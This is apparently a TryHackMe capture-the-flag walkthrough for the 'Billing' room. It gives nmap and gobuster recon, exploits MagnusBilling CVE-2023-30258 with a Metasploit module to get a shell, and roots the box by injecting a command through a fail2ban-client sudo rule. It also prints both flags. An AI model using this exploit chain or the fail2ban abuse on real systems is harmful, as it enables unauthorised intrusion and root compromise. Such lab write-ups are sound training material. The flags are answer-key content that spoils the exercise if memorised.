# 🧠 TryHackMe Room Walkthrough: **Billing**

**Room Link:** [https://tryhackme.com/room/billing](https://tryhackme.com/room/billing)  <br/>
**Written by:** Aditya Bhatt | THM Addict <br/>

<img width="957" height="293" alt="Cover" src="https://github.com/user-attachments/assets/108bb9d6-5101-44f3-ba47-8bbcc5af02f2" /> <br/>

---

## 📦 Overview

> In this walkthrough, we go full force into **TryHackMe's Billing Room**, showcasing a vulnerable MagnusBilling instance, a juicy unauth RCE (CVE-2023-30258), and a fail2ban sudo misconfig that screams “root me.”

This room beautifully blends automated exploitation with creative privilege escalation, giving us a hands-on taste of real-world flaws hiding in VoIP billing software.
We’ll go from **Initial Recon** to **Root Shell** with full PoC, commentary, and 🗿 vibes.

---

## 🌐 Step 1: Enumeration Phase

### 🏁 Initial Landing

After deploying the machine, the first thing that hits you like a misconfigured firewall:

```
http://<machine_IP>/mbilling/
```

This is the MagnusBilling login page. That alone triggers bells — you know you’re in for some juicy CVE play.

<img width="1917" height="1034" alt="Site" src="https://github.com/user-attachments/assets/2fb3a60b-c3ea-4941-a931-de2f76d21d9b" /> <br/>

---

### 🔍 Nmap Deep Recon + Gobuster

We begin with the ultimate recon combo:

```bash
nmap -A -sV -p- 10.10.115.173
```

🧠 **Findings:**

* Port **5038** – Asterisk Call Manager/2.10.6
* Other HTTP services are available under `/mbilling/`

Next, we go full brute with Gobuster:

```bash
gobuster dir -u http://10.10.115.173/mbilling -t 50 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.html,.txt
gobuster dir -u http://10.10.115.173/ -t 50 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php,.html,.txt
```

🧠 **Findings:**

* robots.txt

<img width="876" height="184" alt="Robots" src="https://github.com/user-attachments/assets/549269d1-5dbe-4cf0-b9e4-e4f26e2f35ce" />  <br/>

### 🏗️ robots.txt

Then we check the site's `robots.txt` for anything spicy:

```text
User-agent: *
Disallow: /mbilling/
```

Hmm… trying to hide it just makes us want it more 😈

<img width="876" height="184" alt="Robots" src="https://github.com/user-attachments/assets/3bd31c3c-3e7e-41a0-9a8b-24b3d384f060" />  <br/>

---

## 🔌 Step 2: Exploitation

### 🔥 Port 5038 – Asterisk Manager

A quick netcat test confirms it responds with:

```
Response: Error
Message: Missing action in request
```

Which further confirms: the backend is **MagnusBilling**, and the port is linked with Asterisk Call Manager. Time to summon our dark arts 🧙

<img width="885" height="150" alt="5038" src="https://github.com/user-attachments/assets/71e42714-4530-4b25-a2ca-05b5e38000cf" />  <br/>

---

### ⚔️ Weapon of Choice: CVE-2023-30258

> Exploit: **Unauthenticated Remote Code Execution in MagnusBilling**
> Module: `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`

Fire up Metasploit:

```bash
msfconsole
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
```

<img width="1919" height="1079" alt="msf_1" src="https://github.com/user-attachments/assets/b0b0c746-aabd-4575-a8c5-409d64b96e96" /> <br/>

Then check the requirements:

```bash
show options
```

<img width="1919" height="1079" alt="msf_2" src="https://github.com/user-attachments/assets/4965552e-15d4-416f-8ddf-d2df6a3cf8b0" /> <br/>

Then set the following:

```bash
set RHOSTS 10.10.115.173
set LHOST 10.17.88.138
run
```

<img width="1104" height="101" alt="msf_3" src="https://github.com/user-attachments/assets/69759a51-1fe3-4bd7-ba15-4d8db9e9fa84" /> <br/>
<img width="1272" height="391" alt="msf_4" src="https://github.com/user-attachments/assets/954e34be-953c-4ea9-ae93-c41f49bd3546" />  <br/>

A few seconds later… *Boom.*
We got a Meterpreter session!

```bash
shell
whoami ➤ asterisk
uname -a ➤ Linux Debian 6.1 x86_64
```

Tried spawning a TTY shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="1358" height="384" alt="msf_5_1" src="https://github.com/user-attachments/assets/7b902cc3-1c1f-4842-bba3-6386af9cff6a" />  <br/>

---

## 🧭 Step 3: User Enumeration

We start traversing upward with:

```bash
cd ..
cd ..
```

<img width="1358" height="270" alt="msf_5_2" src="https://github.com/user-attachments/assets/38ebb26d-7929-4661-93ed-028b5630f4f9" /> <br/>

Until we find:

```bash
cd /home/magnus
cat user.txt
```

<img width="1268" height="831" alt="msf_6" src="https://github.com/user-attachments/assets/8b0f45f9-9a66-4aa4-b700-731bb3b03591" />  <br/>

> 🏁 **User Flag:** `THM{4a6831d5f124b25eefb1e92e0f0da4ca}`

Nice! But we’re not done. We need **root**, and Magnus is whispering secrets to us.

---

## 🧨 Step 4: Privilege Escalation

Let’s check what we can run with `sudo`:

```bash
sudo -l
```

**Result:**

```
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

Now *this* is 🔥. We can abuse `fail2ban-client` to execute commands as **root** using ban actions.

---

### 🎯 Fail2Ban Abuse → Root Shell

Let’s restart fail2ban:

```bash
sudo /usr/bin/fail2ban-client restart
```

Then inject the command to steal the root flag:

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"
```

Trigger the ban (and thus the command):

```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

Then:

```bash
cat /tmp/root.txt
```

<img width="1891" height="658" alt="msf_7" src="https://github.com/user-attachments/assets/3db0b154-4924-4a46-b64f-ba8b336fd9b3" /> <br/>

> 🏁 **Root Flag:** `THM{33ad5b530e71a172648f424ec23fae60}`

Rooted. Like. A. Boss. 🗿🔥

---

## ✅ Final Recap Table

| 🔎 Stage             | 💥 Action/Tool Used                                               |
| -------------------- | ----------------------------------------------------------------- |
| Initial Access       | Discovered `/mbilling` portal and port 5038 using Nmap + Gobuster |
| Recon Discovery      | MagnusBilling CMS + Asterisk Call Manager                         |
| Exploitation         | CVE-2023-30258 via Metasploit → Meterpreter shell                 |
| Enumeration          | Located `/home/magnus/user.txt`                                   |
| Privilege Escalation | Abused `fail2ban-client` sudo NOPASSWD → RCE as root              |
| Root Flag            | Retrieved `/root/root.txt` via fail2ban payload injection         |

---

## 🧠 What You Learned (a.k.a. Semi-Pro Wisdom)

1. 🔍 **Recon isn’t just scanning** – Look for hidden pages, check `robots.txt`, and dig into weird ports.
2. 💣 **Exploit known CVEs** – MagnusBilling was vulnerable to a public exploit (CVE-2023-30258).
3. 🔓 **Privilege escalation doesn't always mean kernel exploits** – Misconfigured sudo rights (like on `fail2ban-client`) are just as dangerous.
4. ⚙️ **Creativity matters** – Bypassing user restrictions with ban actions shows real-world lateral thinking.

---

## 🗿 Final Words

This box was a beautiful balance of **automated exploitation** and **manual post-exploitation creativity**.
From MagnusBilling RCE to fail2ban-rooting, it hits all the right notes for a pentester’s playlist 🎧🎯

Whether you're a beginner looking to level up or a seasoned warrior collecting flags — this one’s a **must-pwn**.

Until next time,
**Stay Dangerous. Stay Curious. Stay Majestic. 🗿**

---
